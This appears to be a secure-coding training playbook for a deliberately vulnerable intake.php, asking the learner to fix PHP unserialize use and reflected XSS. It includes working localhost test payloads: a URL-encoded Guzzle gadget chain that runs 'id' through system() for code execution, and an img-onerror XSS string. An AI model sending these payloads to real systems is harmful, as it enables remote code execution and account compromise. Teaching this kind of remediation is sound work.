# playbook-05.md & intake.php

Welcome to this fifth playbook, here you'll learn about basic reflected Cross Site Scripting (XSS) issues and deserialization.

## Unserialize

Goal: Get rid of the dangerous unserialize function by using a safer alternative, or harden the unserialize call to prevent RCE.

Deserialization is a recurring issue for various languages and frameworks. As complex data needs to be parsed and used to reconstruct an object, it has been known to introduce critical security issues (remote code execution, file write, ssrf, ...) on languages such as php, java, ruby, and formats like json, xml, yaml, etc.

```bash
# Test feature
curl -sSkgi 'http://127.0.0.1/intake.php?data=O%3A7%3A%22LogLine%22%3A1%3A%7Bs%3A7%3A%22content%22%3Bs%3A33%3A%22YYYY%2FMM%2FDD%20-%20Software%20X%20rebooted%21%22%3B%7D'
# Should output "Received: YYYY/MM/DD - Software X rebooted!"
# Test exploit
curl -sSkgi 'http://127.0.0.1/intake.php?data=a%3A2%3A%7Bi%3A7%3BO%3A24%3A%22GuzzleHttp%5CPsr7%5CFnStream%22%3A2%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CPsr7%5CFnStream%00methods%22%3Ba%3A1%3A%7Bs%3A5%3A%22close%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A23%3A%22GuzzleHttp%5CHandlerStack%22%3A3%3A%7Bs%3A32%3A%22%00GuzzleHttp%5CHandlerStack%00handler%22%3Bs%3A2%3A%22id%22%3Bs%3A30%3A%22%00GuzzleHttp%5CHandlerStack%00stack%22%3Ba%3A1%3A%7Bi%3A0%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A31%3A%22%00GuzzleHttp%5CHandlerStack%00cached%22%3Bb%3A0%3B%7Di%3A1%3Bs%3A7%3A%22resolve%22%3B%7D%7Ds%3A9%3A%22_fn_close%22%3Ba%3A2%3A%7Bi%3A0%3Br%3A5%3Bi%3A1%3Bs%3A7%3A%22resolve%22%3B%7D%7Di%3A7%3Bi%3A7%3B%7D'
# Should output: "uid=0(root) gid=0(root) groups=0(root)"
```

## Reflected XSS

Goal: Fix the XSS in a way that prevents dangerous characters to be reflected in the webpage.

An XSS allows an attacker to execute arbitrary javascript in the user's behalv. This often allows a session or account compromise, and always permits to take some actions as the victim, like.. Withdraw money, or buy an item and ship it to the attacker's dead-drop!

The main cause of such vulnerability is the lack of input sanitization both at ingest-time, and at display-time.

```bash
# Test feature
curl -sSkgi 'http://127.0.0.1/intake.php?data=O%3A7%3A%22LogLine%22%3A1%3A%7Bs%3A7%3A%22content%22%3Bs%3A33%3A%22YYYY%2FMM%2FDD%20-%20Software%20X%20rebooted%21%22%3B%7D'
# Should output "Received: YYYY/MM/DD - Software X rebooted!"
# Test exploit
google-chrome 'http://127.0.0.1/intake.php?data=O%3A7%3A%22LogLine%22%3A1%3A%7Bs%3A7%3A%22content%22%3Bs%3A42%3A%22%3Cimg%20src%3Da%20onerror%3Dalert%28document.domain%29%3E%22%3B%7D'
curl -sSkgi 'http://127.0.0.1/intake.php?data=O%3A7%3A%22LogLine%22%3A1%3A%7Bs%3A7%3A%22content%22%3Bs%3A42%3A%22%3Cimg%20src%3Da%20onerror%3Dalert%28document.domain%29%3E%22%3B%7D'
# Should open an alert box
```
